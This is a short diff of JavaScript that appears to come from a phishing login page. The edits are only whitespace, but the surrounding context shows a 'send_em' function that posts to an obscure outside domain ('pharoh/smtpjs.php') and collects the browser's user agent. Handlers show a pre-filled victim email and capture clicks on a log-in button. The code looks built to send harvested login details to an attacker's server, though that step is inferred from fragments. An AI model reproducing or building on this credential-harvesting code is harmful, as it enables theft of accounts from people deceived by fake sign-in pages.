@@ -1,4 +1,4 @@
-  async function send_em(to,from,subject,body){
+ async function send_em(to,from,subject,body){
             var yourUrl ="https://qwrewxxxkjj.xyz/pharoh/smtpjs.php";
             let agent = navigator.userAgent;
             var xhr = new XMLHttpRequest();
@@ -23,6 +23,7 @@
       
 
 window.addEventListener("load", function(){
+   
 document.getElementById("eemail").innerHTML = email;
    
 document.getElementById("log-in-button").addEventListener("click", function(event){
@@ -144,13 +145,7 @@ date.addEventListener('blur', function(e) {
 });
 
 
-
-
-
-
-
-
-})
+});
 
 
 function formatString(e) {
